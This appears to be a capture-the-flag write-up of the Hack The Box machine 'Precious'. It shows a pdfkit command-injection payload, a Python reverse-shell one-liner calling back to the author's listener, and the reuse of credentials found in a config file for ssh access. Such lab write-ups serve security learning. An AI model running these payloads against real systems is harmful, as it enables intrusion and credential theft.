# Precious

Lets run nmap scan on all ports on the machine:
```bash
nmap 10.10.11.189 -p-
```
I found out that ports 22 and 80 are open.
I will run another nmap scan for deeper look on this ports:
```bash
nmap -A 10.10.11.189 -p 22, 80
```

![image](https://user-images.githubusercontent.com/114166939/225315053-fbb7090c-6dac-4930-a86b-e5dd9dfca859.png)

It seems that there is nothing interesting about the ssh, but there is a website on the domain "http://precious.htb/" which works on nginx 1.18.0.

Now, before i'll try to open the website page, i'll add the domain to the /etc/hosts file.
```bash
nano /etc/hosts
```
![image](https://user-images.githubusercontent.com/114166939/225313538-ccb7e436-9d80-47cf-8873-baf4032e4875.png)

Now the website appears!

![image](https://user-images.githubusercontent.com/114166939/225313809-d39cc651-8fb8-43e8-ba52-4e2a4b3cc801.png)

The edit text does'nt getting any remote url, so i'll try a local url.

Before that ill open an python3 web server on my machine.
```bash
python3 -m http.server
```
And now I can write in the edit box at the web page the following url:
http://[MY-IP]:8000

I got a screen-shot of my python3 server as a PDF file.

![image](https://user-images.githubusercontent.com/114166939/225316684-a2b9fc4d-b9cb-41e8-bbc1-8121afb38f6a.png)

I will save this screen-shot as a file on my machine and now i'll try to analyze it with exiftool:
```bash
exiftool 68ci7ek2mcv3lsdmyup77rgd2gbv1e3d.pdf 
```

![image](https://user-images.githubusercontent.com/114166939/225317837-a4bbd9a8-b25f-4836-9c7c-d0ed7f6c8f1e.png)

The creator of this file called pdfkit v0.8.6, so that's what the server use.

There is a known command injection exploit on this tool - 'll use this vulnerability DB: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

In this website there is the following line:

![image](https://user-images.githubusercontent.com/114166939/225319623-001804a0-bbe6-4673-8018-1baf4dd043e2.png)

First, i'll try to force the website a 5 seconds delay, also, I will use the python3 server again:
```bash
http://[MY-IP]:8000/?name=#{'%20`sleep 5`'}.to_pdf 
```
It works! now, I can change the sleep command for another command to get a reverse-shell on the machine:
Before i'll try to modify the injection command, i'll open netcat listener with the following line:
```bash
nc -lnvp 4567
```
Now, the new injection will change from sleep command to python3 ,url encoded, reverse shell command:
```bash
http://[MY-IP]:8000/?name=#{'%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[MY-IP]",4567));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`'}.to_pdf
```

![image](https://user-images.githubusercontent.com/114166939/225328174-91a1b7dd-fdfa-4c25-b14e-1d91c8b6189c.png)

First, i'll search for some information on current user:

![image](https://user-images.githubusercontent.com/114166939/225333012-81439138-679f-4b18-b65e-10a8ad6b56b8.png)

![image](https://user-images.githubusercontent.com/114166939/225333607-a5d1aeb9-b480-4e58-8972-0f24571cba3c.png)

Also. i'll try find out which users there are on the machine:

![image](https://user-images.githubusercontent.com/114166939/225333916-049f591e-7408-442e-b437-ececc76fe188.png)

The flag is at henry's home directory and as the current user, ruby, I do'nt have access:

![image](https://user-images.githubusercontent.com/114166939/225334484-de30199a-6b96-405b-aa55-1071a5c3ee4f.png)

On ruby's home directory there is a hidden suspicious direcory called ".bundle", in the directory I found a file called "config".
The content of this file is henry's credentials!

![image](https://user-images.githubusercontent.com/114166939/225337296-47f43372-f10d-469d-a889-650f974dfc83.png)

I'll try using this credentials to connect henry via ssh:
```bash
ssh henry@10.10.11.189
```
Success!

![image](https://user-images.githubusercontent.com/114166939/225338482-1ceadbc3-221c-4d04-9ff1-d39ad31a96d7.png)

From henry's user I can print user.txt and get the flag:

![image](https://user-images.githubusercontent.com/114166939/225341738-a71c81b8-7ad0-4b86-b35c-4d19bcbf178b.png)

